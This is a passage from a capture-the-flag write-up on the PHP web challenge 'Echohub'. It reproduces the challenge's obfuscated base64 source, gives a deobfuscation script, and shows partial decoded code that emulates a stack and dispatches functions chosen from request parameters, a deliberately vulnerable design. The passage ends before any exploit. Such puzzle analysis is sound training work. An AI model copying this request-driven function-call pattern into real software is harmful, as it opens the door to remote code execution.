### Echohub
#### other writeup (via players)
##### `mb_ereg_replace /e`
https://gist.github.com/st98/7c8cff5fe149dcad17923da408a9916d

#### A quick start

The website is very simple, it can output what you input. So I call it `Echohub`.

![](https://i.imgur.com/VNUUHf1.png)

But you can easily find a hint when you view the  HTML source code.

```htmlmixed
<!--/?source=1-->
<pre>
...
```

Now We've got almost entire environment.
```php
...
if(isset($_GET['source'])){

$file = fopen("index.php","r");
$contents = fread($file,filesize("index.php"));
echo "---------------sourcecode---------------";
echo base64_encode($contents);
echo "----------------------------------------";
fclose($file);
    //Dockerfile here
echo "RlJPTSB1YnVudHU6MTguMDQKClJVTiBzZWQgLWkgInMvaHR0cDpcL1wvYXJjaGl2ZS51YnVudHUuY29tL2h0dHA6XC9cL21pcnJvcnMudXN0Yy5lZHUuY24vZyIgL2V0Yy9hcHQvc291cmNlcy5saXN0ClJVTiBhcHQtZ2V0IHVwZGF0ZQpSVU4gYXB0LWdldCAteSBpbnN0YWxsIHNvZnR3YXJlLXByb3BlcnRpZXMtY29tbW9uClJVTiBhZGQtYXB0LXJlcG9zaXRvcnkgLXkgcHBhOm9uZHJlai9waHAKUlVOIGFwdC1nZXQgdXBkYXRlClJVTiBhcHQtZ2V0IC15IHVwZ3JhZGUKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB0emRhdGEKUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCB2aW0KUlVOIGFwdC1nZXQgLXkgaW5zdGFsbCBhcGFjaGUyClJVTiBhcHQtY2FjaGUgc2VhcmNoICJwaHAiIHwgZ3JlcCAicGhwNy4zInwgYXdrICd7cHJpbnQgJDF9J3wgeGFyZ3MgYXB0LWdldCAteSBpbnN0YWxsClJVTiBzZXJ2aWNlIC0tc3RhdHVzLWFsbCB8IGF3ayAne3ByaW50ICQ0fSd8IHhhcmdzIC1pIHNlcnZpY2Uge30gc3RvcAoKUlVOIHJtIC92YXIvd3d3L2h0bWwvaW5kZXguaHRtbApDT1BZIHJhbmRvbXN0YWNrLnBocCAvdmFyL3d3dy9odG1sL2luZGV4LnBocApDT1BZIHNhbmRib3gucGhwIC92YXIvd3d3L2h0bWwvc2FuZGJveC5waHAKUlVOIGNobW9kIDc1NSAtUiAvdmFyL3d3dy9odG1sLwpDT1BZIGZsYWcgL2ZsYWcKQ09QWSByZWFkZmxhZyAvcmVhZGZsYWcKUlVOIGNobW9kIDU1NSAvcmVhZGZsYWcKUlVOIGNobW9kIHUrcyAvcmVhZGZsYWcKUlVOIGNobW9kIDUwMCAvZmxhZwpDT1BZIC4vcnVuLnNoIC9ydW4uc2gKQ09QWSAuL3BocC5pbmkgL2V0Yy9waHAvNy4zL2FwYWNoZTIvcGhwLmluaQpSVU4gY2htb2QgNzAwIC9ydW4uc2gKCkNNRCBbIi9ydW4uc2giXQ=="; 
highlight_file(__FILE__);
...

```
The sourcecode of `index.php` is 
```php
base64_decode("PD9waHAgLyogb3J6DQotLSBlbnBocCA6IGh0dHBzOi8vZ2l0Lm9zY2hpbmEubmV0L216L216cGhwMg0KICovIGVycm9yX3JlcG9ydGluZyhFX0FMTF5FX05PVElDRSk7ZGVmaW5lKCdPMCcsICdPJyk79DskR0xPQkFMU1tPMF0gPSBleHBsb2RlKCd8AXwFfAEnLCBnemluZmxhdGUoc3Vic3RyKCcfiwgAAAAAAAADdVLJUsMwDIUD/xFOwIFSys4wzLC07C1MuXsUV2lCHdvYThemH4+plaaU4kPmyfLTe5JiQfZiNa7pVE/XpxvTdZflGJA1PhdgD5NM0vVDu8s6rVa3+R7i6hXCmEBMxdCWICMAxsCEJeJ3PAIxoNgKQ/LOCJRzzKwWmatCDaS6Nr8zOAw4zmQjRTIDMff2+2n2MRC5VPrTWFcMR+PJ19X1zW2zdXf/+PT80n59a3bf9xsHh0fHXCenZ4Ga+tYEsh44CBd9lIyDBDOhtvLZqdVqt0puuQicAz6Ictws58bnPnRh06oSV4WkbvwTPvhV1nMavgear1IusjCx5xEVUnpp3ga5GqJZMIpjLVQPl4bPQYi5gvdWNuVmTJYYlTOD/cXN/LiuyKywXiYpJGez9KoMde4LRmiMom126p1OvdyUnxExBVjLQGRgK9qivEUwnAz4XzSTiQrB7oqjCqcLtyqze7EXm8vZXCfQw9NKrcr/5ZLu9s4/ZcsduG+Cc53ZTAMAACcsMHgwYSwgLTgpKSk7kLrex8jgu4+qOwogcmVxdWlyZV9vbmNlICRHTE9CQUxTe08wfVswXTsKCgokc2VlZCA9ICRHTE9CQUxTe08wfXsweDAwMX0oKTsKJEdMT0JBTFN7TzB9WzB4MDAwMl0oJHNlZWQpOwokR0xPQkFMU3tPMH17MHgwMDAwM30oJEdMT0JBTFN7TzB9WzB4MDAwMDA0XSwkR0xPQkFMU3tPMH17MHgwNX0oMHgwMDAwLDB4ZmZmZikpOwoKJHJlZ3MgPSBhcnJheSgKICAgICRHTE9CQUxTe08wfVsweDAwNl09PjB4MCwKICAgICRHTE9CQUxTe08wfXsweDAwMDd9PT4weDAsCiAgICAkR0xPQkFMU3tPMH1bMHgwMDAwOF09PjB4MCwKICAgICRHTE9CQUxTe08wfXsweDAwMDAwOX09PjB4MCwKKTsKCgpmdW5jdGlvbiBhc2xyKCYkTzAwLCRPME8pCnsKICAgICRPMDAgPSAkTzAwICsgMHg2MDAwMDAwMCArIElOU19PRkZTRVQgKyAweDAwMSA7DQoKfQokZnVuY18gPSAkR0xPQkFMU3tPMH1bMHgwYV0oJGZ1bmMpOwokR0xPQkFMU3tPMH17MHgwMGJ9KCRmdW5jXywkR0xPQkFMU3tPMH1bMHgwMDBjXSk7CiRwbHQgPSAkR0xPQkFMU3tPMH1bMHgwYV0oJGZ1bmNfKTsKCgpmdW5jdGlvbiBoYW5kbGVfZGF0YSgkT09PKXskT08wTz0mJEdMT0JBTFN7TzB9OwogICAgJE8wMDAgPSAkT08wT3sweDAwMDBkfSgkT09PKTsNCgogICAgJE8wME8gPSAkTzAwMC8weDAwMDAwNCsoMHgwMDEqKCRPMDAwJTB4MDAwMDA0KSk7DQqQmJHKp5n71bDEqaaf4LmKsIjh+MTjksPwmvj7rdLDiOrV0pLuz+iglZPGtDsKICAgICRPME8wID0gJE9PME9bMHgwMDAwMGVdKCRPT08sMHgwMDAwMDQpOw0KkKWJoZ/NOwogICAgJE8wTzBbJE8wME8tMHgwMDFdID0gJE9PME97MHgwZn0oJE8wTzBbJE8wME8tMHgwMDFdLDB4MDAwMDA0LCRPTzBPWzB4MDAxMF0pOw0KCiAgICBmb3JlYWNoICgkTzBPMCAgYXMgICRPME9PPT4mJE9PMDApewogICAgICAgICRPTzAwID0gJE9PME97MHgwMDAxMX0oJE9PME9bMHgwMDAwMTJdKCRPTzAwKSk7DQoKICAgIH0KICAgIHJldHVybiAkTzBPMDsNCgp9CgpmdW5jdGlvbiBnZW5fY2FuYXJ5KCl7JE8wTzAwPSYkR0xPQkFMU3tPMH07CiAgICAkT09PTyA9ICRPME8wMHsweDAwMDAwMTN9Ow0KkPL63baEyTsKICAgICRPMDAwMCA9ICRPT09PWyRPME8wMHsweDA1fSgwLCRPME8wMHsweDAwMDBkfSgkT09PTyktMHgwMDEpXTsNCgogICAgJE8wMDBPID0gJE9PT09bJE8wTzAwezB4MDV9KDAsJE8wTzAwezB4MDAwMGR9KCRPT09PKS0weDAwMSldOw0KkKfFnbzY5PDN5bDz79KTvdjFz8+T28OPuvqThIjp34SSpqLO/ofAze3wwd3E1Jyem+vtrseyvYKt0Ye1vOe6zo7cnY7k3dvSz52wOwogICAgJE8wME8wID0gJE9PT09bJE8wTzAwezB4MDV9KDAsJE8wTzAwezB4MDAwMGR9KCRPT09PKS0weDAwMSldOw0KCiAgICAkTzAwT08gPSAkTzBPMDBbMHgwMDEwXTsNCpCOuaG9gtT7hILNjLiK8/LYgtD2kLbV64mlijsKICAgIHJldHVybiAkTzBPMDBbMHgwMTRdKCRPMDAwMC4kTzAwME8uJE8wME8wLiRPMDBPTylbMF07DQoKfQokY2FuYXJ5ID0gJEdMT0JBTFN7TzB9ezB4MDAxNX0oKTsKJGNhbmFyeWNoZWNrID0gJGNhbmFyeTsKCmZ1bmN0aW9uIGNoZWNrX2NhbmFyeSgpewogICAgZ2xvYmFsICRjYW5hcnk7DQoKICAgIGdsb2JhbCAkY2FuYXJ5Y2hlY2s7DQqQjMCQysLkx8fnltOgoDsKICAgIGlmKCRjYW5hcnkgIT0gJGNhbmFyeWNoZWNrKXsKICAgICAgICBkaWUoJEdMT0JBTFN7TzB9WzB4MDAwMTZdKTsKICAgIH0KCn0KCkNsYXNzIE8wT08wewogICAgcHJpdmF0ZSAgJGVicCwkc3RhY2ssJGVzcDsKCiAgICBwdWJsaWMgIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRPME9PTywkT08wMDApIHskT08wME89JiRHTE9CQUxTe08wfTsKICAgICAgICAkdGhpcy0+c3RhY2sgPSBhcnJheSgpOw0KkMrl8dqcx8el7dLfqNDnl92op6jrjPCz9DsKICAgICAgICBnbG9iYWwgJHJlZ3M7DQoKICAgICAgICAkdGhpcy0+ZWJwID0gJiRyZWdzWyRPTzAwT3sweDAwMDd9XTsNCgogICAgICAgICR0aGlzLT5lc3AgPSAmJHJlZ3NbJE9PMDBPWzB4MDAwMDhdXTsNCgogICAgICAgICR0aGlzLT5lYnAgPSAweGZmZmUwMDAwICsgJE9PMDBPezB4MDV9KDB4MDAwMCwweGZmZmYpOw0KCiAgICAgICAgZ2xvYmFsICRjYW5hcnk7DQqQm5GV9a3dvtPLkbP0OwogICAgICAgICR0aGlzLT5zdGFja1skdGhpcy0+ZWJwIC0gMHg0XSA9ICYkY2FuYXJ5Ow0KkMDEtDsKICAgICAgICAkdGhpcy0+c3RhY2tbJHRoaXMtPmVicF0gPSAkdGhpcy0+ZWJwICsgJE9PMDBPezB4MDV9KDB4MDAwMCwweGZmZmYpOw0KkNrktuHszIu99q7ZiMTPtqOPiu+gvuSDOwogICAgICAgICR0aGlzLT5lc3AgPSAkdGhpcy0+ZWJwIC0gKCRPTzAwT3sweDA1fSgweDIwLDB4NjApKjB4MDAwMDA0KTsNCpCfpq3P54i1nuqj6/Xh4qW76+qMo46brf276+O/xtWD5vyxt+S57ISlkO+b8tPBrsCsOwogICAgICAgICR0aGlzLT5zdGFja1skdGhpcy0+ZWJwICsgMHg0XSA9ICRPTzAwT3sweDAwMDAxN30oJE8wT09PKTsNCgogICAgICAgIGlmKCRPTzAwMCAhPSBOVUxMKQogICAgICAgICAgICAkdGhpcy0+eyRHTE9CQUxTe08wfVsweDAwMDAwMThdfSgkT08wMDApOwogICAgfQoKICAgIHB1YmxpYyAgZnVuY3Rpb24gcHVzaGRhdGEoJE9PME8wKXskT09PMDA9JiRHTE9CQUxTe08wfTsKICAgICAgICAkT08wTzAgPSAkT09PMDBbMHgwMTRdKCRPTzBPMCk7DQqQkrmS/p7SxvPVrfCI5NbC0tvn48uE1qDFhuDywMWul9foqteHOwogICAgICAgIGZvcigkT08wT089MDskT08wT088JE9PTzAwezB4MDE5fSgkT08wTzApOyRPTzBPTysrKXsKICAgICAgICAgICAgJHRoaXMtPnN0YWNrWyR0aGlzLT5lc3ArKCRPTzBPTyoweDAwMDAwNCldID0gJE9PME8wWyRPTzBPT107DQqQ08zs27LEnoWghunsisCN0MbtxIiz8qCM28rj48eD3zsvL25vIGFyZ3MgaW4gbXkgc3RhY2sgaGFoYQogICAgICAgICAgICAkT09PMDBbMHgwMDFhXSgpOw0KCiAgICAgICAgfQogICAgfQoKICAgIHB1YmxpYyAgZnVuY3Rpb24gcmVjb3Zlcl9kYXRhKCRPT08wTyl7JE9PT08wPSYkR0xPQkFMU3tPMH07CgogICAgICAgIHJldHVybiAkT09PTzB7MHgwMDAxYn0oJE9PT08wezB4MDAwMTF9KCRPT08wTykpOw0KkIOSlYiznPGgp7Ot9/qcvITQsKTdje7C8LbF0NKWnsmZsd+i5PuVhqTJtJzF0NnJoortgJfdwomVidnnoPc7CgogICAgfQoKCiAgICBwdWJsaWMgIGZ1bmN0aW9uIG91dHB1dGRhdGEoKXskTzAwMDBPPSYkR0xPQkFMU3tPMH07CiAgICAgICAgZ2xvYmFsICRyZWdzOw0KCiAgICAgICAgZWNobyAkTzAwMDBPWzB4MDAwMDFjXTsNCgogICAgICAgIHdoaWxlKDB4MDAxKXsKICAgICAgICAgICAgaWYoJHRoaXMtPmVzcCA9PSAkdGhpcy0+ZWJwLTB4NCkKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAkdGhpcy0+eyRHTE9CQUxTe08wfXsweDAwMDAwMWR9fSgkTzAwMDBPWzB4MDFlXSk7DQoKICAgICAgICAgICAgJE9PT09PID0gJHRoaXMtPnskR0xPQkFMU3tPMH17MHgwMDFmfX0oJHJlZ3NbJE8wMDAwT1sweDAxZV1dKTsNCgogICAgICAgICAgICAkTzAwMDAwID0gJE8wMDAwT1sweDAwMDIwXSgkTzAwMDBPWzB4MDAxMF0sJE9PT09PKTsNCpDzlbM7CiAgICAgICAgICAgIGVjaG8gJE8wMDAwMFswXTsNCgogICAgICAgICAgICBpZigkTzAwMDBPezB4MDE5fSgkTzAwMDAwKT4weDAwMSl7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICB9CiAgICBwdWJsaWMgIGZ1bmN0aW9uIHJldCgpeyRPMDAwTzA9JiRHTE9CQUxTe08wfTsKCiAgICAgICAgJHRoaXMtPmVzcCA9ICR0aGlzLT5lYnA7DQqQmqvNOwogICAgICAgICR0aGlzLT57JEdMT0JBTFN7TzB9ezB4MDAwMDAxZH19KCRPMDAwTzB7MHgwMDA3fSk7DQoKICAgICAgICAkdGhpcy0+eyRHTE9CQUxTe08wfXsweDAwMDAwMWR9fSgkTzAwME8wezB4MDAwMDIxfSk7DQoKICAgICAgICAkdGhpcy0+eyRHTE9CQUxTe08wfVsweDAwMDAwMjJdfSgpOw0KCiAgICB9CgogICAgcHVibGljICBmdW5jdGlvbiBnZXRfZGF0YV9mcm9tX3JlZygkTzAwME9PKXskTzAwT08wPSYkR0xPQkFMU3tPMH07CiAgICAgICAgZ2xvYmFsICRyZWdzOw0KCiAgICAgICAgJE8wME8wMCA9ICR0aGlzLT57JEdMT0JBTFN7TzB9ezB4MDAxZn19KCRyZWdzWyRPMDAwT09dKTsNCpDXOwogICAgICAgICRPMDBPME8gPSAkTzAwT08wWzB4MDAwMjBdKCRPMDBPTzBbMHgwMDEwXSwkTzAwTzAwKTsNCgogICAgICAgIHJldHVybiAkTzAwTzBPWzBdOw0KCiAgICB9CgogICAgcHVibGljICBmdW5jdGlvbiBjYWxsKCkKICAgIHskTzBPTzAwPSYkR0xPQkFMU3tPMH07CiAgICAgICAgZ2xvYmFsICRyZWdzOw0KCiAgICAgICAgZ2xvYmFsICRwbHQ7DQoKICAgICAgICAkTzAwT09PID0gJE8wT08wMHsweDAyM30oJHJlZ3NbJE8wT08wMHsweDAwMDAwOX1dKTsNCgogICAgICAgIGlmKGlzc2V0KCRfUkVRVUVTVFskTzAwT09PXSkpIHsKICAgICAgICAgICAgJHRoaXMtPnskR0xPQkFMU3tPMH17MHgwMDAwMDFkfX0oJE8wT08wMFsweDAwNl0pOwogICAgICAgICAgICAkTzBPMDAwID0gKGludCkkdGhpcy0+eyRHTE9CQUxTe08wfVsweDAwMjRdfSgkTzBPTzAwWzB4MDFlXSk7CiAgICAgICAgICAgICRPME8wME8gPSBhcnJheSgpOwogICAgICAgICAgICBmb3IoJE8wTzBPMD0wOyRPME8wTzA8JE8wTzAwMDskTzBPME8wKyspewogICAgICAgICAgICAgICAgJHRoaXMtPnskR0xPQkFMU3tPMH17MHgwMDAwMDFkfX0oJE8wT08wMFsweDAwNl0pOwogICAgICAgICAgICAgICAgJE8wTzBPTyA9ICR0aGlzLT57JEdMT0JBTFN7TzB9WzB4MDAyNF19KCRPME9PMDBbMHgwMWVdKTsKICAgICAgICAgICAgICAgICRPME9PMDB7MHgwMDAyNX0oJE8wTzAwTywkX1JFUVVFU1RbJE8wTzBPT10pOwogICAgICAgICAgICB9CiAgICAgICAgICAgICRPME9PMDBbMHgwMDAwMjZdKCRwbHRbJE8wME9PT10sJE8wTzAwTyk7CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkTzBPTzAwezB4MDAwMDAyN30oJHBsdFskTzAwT09PXSk7CiAgICAgICAgfQoKICAgIH0KCiAgICBwdWJsaWMgIGZ1bmN0aW9uIHB1c2goJE8wT08wTyl7JE8wT09PTz0mJEdMT0JBTFN7TzB9OwogICAgICAgIGdsb2JhbCAkcmVnczsNCgogICAgICAgICRPME9PTzAgPSAkcmVnc1skTzBPTzBPXTsNCpDdxOLtufii9sLz+t2fyZvVh9mlotv80uau65PYt/qtlsCRhPmKp/HNnO2ru7fGkr6ht+D8tLTjOwogICAgICAgIGlmKCAkTzBPT09PezB4MDAwMWJ9KCRPME9PT097MHgwMDAxMX0oJE8wT09PMCkpID09IE5VTEwgKSBkaWUoJE8wT09PT1sweDAyOF0pOwogICAgICAgICR0aGlzLT5zdGFja1skdGhpcy0+ZXNwXSA9ICRPME9PTzA7DQqQvdfy6+2z/PKtiJqg1baOgfLGyIaF6b7m5/Oby9i7xDsKICAgICAgICAkdGhpcy0+ZXNwIC09IDB4MDAwMDA0Ow0KCiAgICB9CgogICAgcHVibGljICBmdW5jdGlvbiBwb3AoJE9PMDAwMCl7CiAgICAgICAgZ2xvYmFsICRyZWdzOw0KCiAgICAgICAgJHJlZ3NbJE9PMDAwMF0gPSAkdGhpcy0+c3RhY2tbJHRoaXMtPmVzcF07DQoKICAgICAgICAkdGhpcy0+ZXNwICs9IDB4MDAwMDA0Ow0KCgogICAgfQoKICAgIHB1YmxpYyAgZnVuY3Rpb24gX19jYWxsKCRPTzAwME8sJE9PMDBPMCkKICAgIHsKICAgICAgICAkR0xPQkFMU3tPMH1bMHgwMDFhXSgpOw0KCiAgICB9Cgp9JEdMT0JBTFN7TzB9ezQzfSgkR0xPQkFMU3tPMH17MHgwMDI5fSwkR0xPQkFMU3tPMH1bMHgwMDAyYV0sMCk7cHJpbnRfUigkR0xPQkFMU3tPMH17MHgwMDI5fSk7cHJpbnRfUigkR0xPQkFMU3tPMH1bMHgwMDAyYV0pOwoKaWYoaXNzZXQoJF9QT1NUWyRHTE9CQUxTe08wfVsweDAwMDAwMmNdXSkpIHsKICAgICAgICAkcGhwaW5mb19hZGRyID0gJEdMT0JBTFN7TzB9ezB4MDJkfSgkR0xPQkFMU3tPMH1bMHgwMDJlXSwgJHBsdCk7CiAgICAgICAgJGdldHMgPSAkX1BPU1RbJEdMT0JBTFN7TzB9WzB4MDAwMDAyY11dOwogICAgICAgICRtYWluX3N0YWNrID0gbmV3ICRHTE9CQUxTe08wfVsweDAwMDJhXSgkcGhwaW5mb19hZGRyLCAkZ2V0cyk7CiAgICAgICAgZWNobyAkR0xPQkFMU3tPMH17MHgwMDAyZn07CiAgICAgICAgJG1haW5fc3RhY2stPnskR0xPQkFMU3tPMH1bMHgwMDAwMzBdfSgpOwogICAgICAgIGVjaG8gJEdMT0JBTFN7TzB9ezB4MDAwMDAzMX07CiAgICAgICAgJG1haW5fc3RhY2stPnskR0xPQkFMU3tPMH1bMHgwMzJdfSgpOwp9Cg==");
```
It seems to be an obfuscated PHP source code.

![](https://i.imgur.com/GlFzwFI.png)

Now, we have to solve this code confusion.

#### Decryption

We can see that this code is not very confusing. Any way, it just extracts some symbols to a global symbols table, and injecting some junk codes as below.

```
˜‘Ê§™ûÕ°Ä©¦Ÿà¹Š°ˆáøÄã’Ãðšøû­ÒÃˆêÕÒ’îÏè •“Æ´;
```
Ok, now the only two things we have to do \:
* Stripping junk codes ;
* Replacing the symbols according to the symbols-table ;

The first step is easy , but note that the editor we use shouldn't change the file's encoding method. We can use some binary editors, such as 010editor.

After the first step, the source code shows like this (symbols-table is still confusing):

```php

<?php 

error_reporting(E_ALL^E_NOTICE);
define('O0', 'O');


//symbols-table
$GLOBALS[O0] = explode('|||', gzinflate(substr('‹uRÉRÃ0…ÿNÀRÊÎ0Ì°´ì-L¹{WiBÛØN¦©•¦”âCæÉòÓ{’bAöb5®éTO×§Óu—å5>`“LÒõC»Ë:­V·ùâêÂ˜@LÅÐ– #ÆÀ„%âw<1 Ø
CòÎ”sÌ¬™«B
¤º6¿388Îd#E21÷öûiö1¹TúÓXWGãÉ×ÕõÍm³uwÿøôüÒ~}kvß÷‡GÇ\'§gšúÖ²8}”Œƒ3¡¶òÙ©Õj·Jn¹œ>ˆrÜ,çÆç>taÓªW…¤nü>øUÖs¾š¯R.²0±çRziÞ¹¢Y0Šc-T—†ÏAˆ¹‚÷V6åfL–•3ƒýÅÍü¸®È¬°^&)$g³ôªuîFhŒ¢mvêN½Ü”Ÿ1XË@d`+Ú¢¼E0œø_4“‰
ÁîŠ£
§·*³{±›ËÙ\'ÐÃÓJ­Êÿå’îöÎ?eË¸o‚sÙL',0x0a, -8)));
 



require_once $GLOBALS{O0}[0];


$seed = $GLOBALS{O0}{0x001}();
$GLOBALS{O0}[0x0002]($seed);
$GLOBALS{O0}{0x00003}($GLOBALS{O0}[0x000004],$GLOBALS{O0}{0x05}(0x0000,0xffff));

$regs = array(
    $GLOBALS{O0}[0x006]=>0x0,
    $GLOBALS{O0}{0x0007}=>0x0,
    $GLOBALS{O0}[0x00008]=>0x0,
    $GLOBALS{O0}{0x000009}=>0x0,
);


function aslr(&$O00,$O0O)
{
    $O00 = $O00 + 0x60000000 + INS_OFFSET + 0x001 ;

}
$func_ = $GLOBALS{O0}[0x0a]($func);
$GLOBALS{O0}{0x00b}($func_,$GLOBALS{O0}[0x000c]);
$plt = $GLOBALS{O0}[0x0a]($func_);


function handle_data($OOO){$OO0O=&$GLOBALS{O0};
    $O000 = $OO0O{0x0000d}($OOO);

    $O00O = $O000/0x000004+(0x001*($O000%0x000004));

    $O0O0 = $OO0O[0x00000e]($OOO,0x000004);

    $O0O0[$O00O-0x001] = $OO0O{0x0f}($O0O0[$O00O-0x001],0x000004,$OO0O[0x0010]);

    foreach ($O0O0  as  $O0OO=>&$OO00){
        $OO00 = $OO0O{0x00011}($OO0O[0x000012]($OO00));

    }
    return $O0O0;

}

function gen_canary(){$O0O00=&$GLOBALS{O0};
    $OOOO = $O0O00{0x0000013};

    $O0000 = $OOOO[$O0O00{0x05}(0,$O0O00{0x0000d}($OOOO)-0x001)];

    $O000O = $OOOO[$O0O00{0x05}(0,$O0O00{0x0000d}($OOOO)-0x001)];

    $O00O0 = $OOOO[$O0O00{0x05}(0,$O0O00{0x0000d}($OOOO)-0x001)];

    $O00OO = $O0O00[0x0010];

    return $O0O00[0x014]($O0000.$O000O.$O00O0.$O00OO)[0];

}
$canary = $GLOBALS{O0}{0x0015}();
$canarycheck = $canary;

function check_canary(){
    global $canary;

    global $canarycheck;

    if($canary != $canarycheck){
        die($GLOBALS{O0}[0x00016]);
    }

}

Class O0OO0{
    private  $ebp,$stack,$esp;

    public  function __construct($O0OOO,$OO000) {$OO00O=&$GLOBALS{O0};
        $this->stack = array();

        global $regs;

        $this->ebp = &$regs[$OO00O{0x0007}];

        $this->esp = &$regs[$OO00O[0x00008]];

        $this->ebp = 0xfffe0000 + $OO00O{0x05}(0x0000,0xffff);

        global $canary;

        $this->stack[$this->ebp - 0x4] = &$canary;

        $this->stack[$this->ebp] = $this->ebp + $OO00O{0x05}(0x0000,0xffff);

        $this->esp = $this->ebp - ($OO00O{0x05}(0x20,0x60)*0x000004);

        $this->stack[$this->ebp + 0x4] = $OO00O{0x000017}($O0OOO);

        if($OO000 != NULL)
            $this->{$GLOBALS{O0}[0x0000018]}($OO000);
    }

    public  function pushdata($OO0O0){$OOO00=&$GLOBALS{O0};
        $OO0O0 = $OOO00[0x014]($OO0O0);

        for($OO0OO=0;$OO0OO<$OOO00{0x019}($OO0O0);$OO0OO++){
            $this->stack[$this->esp+($OO0OO*0x000004)] = $OO0O0[$OO0OO];//no args in my stack haha
            $OOO00[0x001a]();

        }
    }

    public  function recover_data($OOO0O){$OOOO0=&$GLOBALS{O0};

        return $OOOO0{0x0001b}($OOOO0{0x00011}($OOO0O));

    }


    public  function outputdata(){$O0000O=&$GLOBALS{O0};
        global $regs;

        echo $O0000O[0x00001c];

        while(0x001){
            if($this->esp == $this->ebp-0x4)
                break;
            $this->{$GLOBALS{O0}{0x000001d}}($O0000O[0x01e]);

            $OOOOO = $this->{$GLOBALS{O0}{0x001f}}($regs[$O0000O[0x01e]]);

            $O00000 = $O0000O[0x00020]($O0000O[0x0010],$OOOOO);

            echo $O00000[0];

            if($O0000O{0x019}($O00000)>0x001){
                break;
            }
        }

    }
    public  function ret(){$O000O0=&$GLOBALS{O0};

        $this->esp = $this->ebp;

        $this->{$GLOBALS{O0}{0x000001d}}($O000O0{0x0007});

        $this->{$GLOBALS{O0}{0x000001d}}($O000O0{0x000021});

        $this->{$GLOBALS{O0}[0x0000022]}();

    }

    public  function get_data_from_reg($O000OO){$O00OO0=&$GLOBALS{O0};
        global $regs;

        $O00O00 = $this->{$GLOBALS{O0}{0x001f}}($regs[$O000OO]);

        $O00O0O = $O00OO0[0x00020]($O00OO0[0x0010],$O00O00);

        return $O00O0O[0];

    }

    public  function call()
    {$O0OO00=&$GLOBALS{O0};
        global $regs;

        global $plt;

        $O00OOO = $O0OO00{0x023}($regs[$O0OO00{0x000009}]);

        if(isset($_REQUEST[$O00OOO])) {
            $this->{$GLOBALS{O0}{0x000001d}}($O0OO00[0x006]);
            $O0O000 = (int)$this->{$GLOBALS{O0}[0x0024]}($O0OO00[0x01e]);
            $O0O00O = array();
            for($O0O0O0=0;$O0O0O0<$O0O000;$O0O0O0++){
                $this->{$GLOBALS{O0}{0x000001d}}($O0OO00[0x006]);
                $O0O0OO = $this->{$GLOBALS{O0}[0x0024]}($O0OO00[0x01e]);
                $O0OO00{0x00025}($O0O00O,$_REQUEST[$O0O0OO]);
            }
            $O0OO00[0x000026]($plt[$O00OOO],$O0O00O);
        }
        else {
            $O0OO00{0x0000027}($plt[$O00OOO]);
        }

    }

    public  function push($O0OO0O){$O0OOOO=&$GLOBALS{O0};
        global $regs;

        $O0OOO0 = $regs[$O0OO0O];

        if( $O0OOOO{0x0001b}($O0OOOO{0x00011}($O0OOO0)) == NULL ) die($O0OOOO[0x028]);
        $this->stack[$this->esp] = $O0OOO0;

        $this->esp -= 0x000004;

    }

    public  function pop($OO0000){
        global $regs;

        $regs[$OO0000] = $this->stack[$this->esp];

        $this->esp += 0x000004;


    }

    public  function __call($OO000O,$OO00O0)
    {
        $GLOBALS{O0}[0x001a]();

    }

}$GLOBALS{O0}{43}($GLOBALS{O0}{0x0029},$GLOBALS{O0}[0x0002a],0);print_R($GLOBALS{O0}{0x0029});print_R($GLOBALS{O0}[0x0002a]);

if(isset($_POST[$GLOBALS{O0}[0x000002c]])) {
        $phpinfo_addr = $GLOBALS{O0}{0x02d}($GLOBALS{O0}[0x002e], $plt);
        $gets = $_POST[$GLOBALS{O0}[0x000002c]];
        $main_stack = new $GLOBALS{O0}[0x0002a]($phpinfo_addr, $gets);
        echo $GLOBALS{O0}{0x0002f};
        $main_stack->{$GLOBALS{O0}[0x000030]}();
        echo $GLOBALS{O0}{0x0000031};
        $main_stack->{$GLOBALS{O0}[0x032]}();
}

```

The second step, We can write a script to solve.

```php
<?php
include('test.php');

//print_r($GLOBALS[O0]);
$file_en = file_get_contents("test.php");
foreach($GLOBALS[O0] as $index=>$symbol){
    //recover functions
    $file_en=preg_replace('/\$GLOBALS[\{|\[]O0[\}|\]][\{|\[]0x[0]*'.(string)dechex($index).'[\}|\]]\(/', $symbol."(", $file_en);
    $file_en=preg_replace('/\$GLOBALS[\{|\[]O0[\}|\]][\{|\[]'.(string)$index.'[\}|\]]\(/', $symbol."(", $file_en);
    $file_en=preg_replace('/\$(OO00O|O000O0|O0OO00|O0OOOO|O00OO0|O0000O|OOO00|OOOO0|O0O00|OO0O)[\{|\[]0x[0]*'.(string)dechex($index).'[\}|\]]\(/', $symbol."(", $file_en);
    $file_en=preg_replace('/\$(OO00O|O000O0|O0OO00|O0OOOO|O00OO0|O0000O|OOO00|OOOO0|O0O00|OO0O)[\{|\[]'.(string)$index.'[\}|\]]\(/', $symbol."(", $file_en);
    //recover strings
    $file_en=preg_replace('/\$GLOBALS[\{|\[]O0[\}|\]][\{|\[]0x[0]*'.(string)dechex($index).'[\}|\]]/', "'".addslashes($symbol)."'", $file_en);
    $file_en=preg_replace('/\$GLOBALS[\{|\[]O0[\}|\]][\{|\[]'.(string)$index.'[\}|\]]/', "'".addslashes($symbol)."'", $file_en);
    $file_en=preg_replace('/\$(OO00O|O000O0|O0OO00|O0OOOO|O00OO0|O0000O|OOO00|OOOO0|O0O00|OO0O)[\{|\[]0x[0]*'.(string)dechex($index).'[\}|\]]/', "'".addslashes($symbol)."'", $file_en);
    $file_en=preg_replace('/\$(OO00O|O000O0|O0OO00|O0OOOO|O00OO0|O0000O|OOO00|OOOO0|O0O00|OO0O)[\{|\[]'.(string)$index.'[\}|\]]/',"'".addslashes($symbol)."'", $file_en);
    
}                 //$GLOBALS    {        O0    }                 [   0x00000         2c                       ]

//we know $GLOBALS[0x0010] is "\x00"
$file_en = preg_replace('/\'\$[^\']*\'/','"\\x00"',$file_en);


file_put_contents('de_.php',$file_en);

```
After running it, we got `de_.php`

```php
<?php 

error_reporting(E_ALL^E_NOTICE);
define('O0', 'O');

//PLZ delete the confusing symbols-table, it is no use now
require_once 'sandbox.php';


$seed = time();
srand($seed);
define('INS_OFFSET',rand(0x0000,0xffff));

$regs = array(
    'eax'=>0x0,
    'ebp'=>0x0,
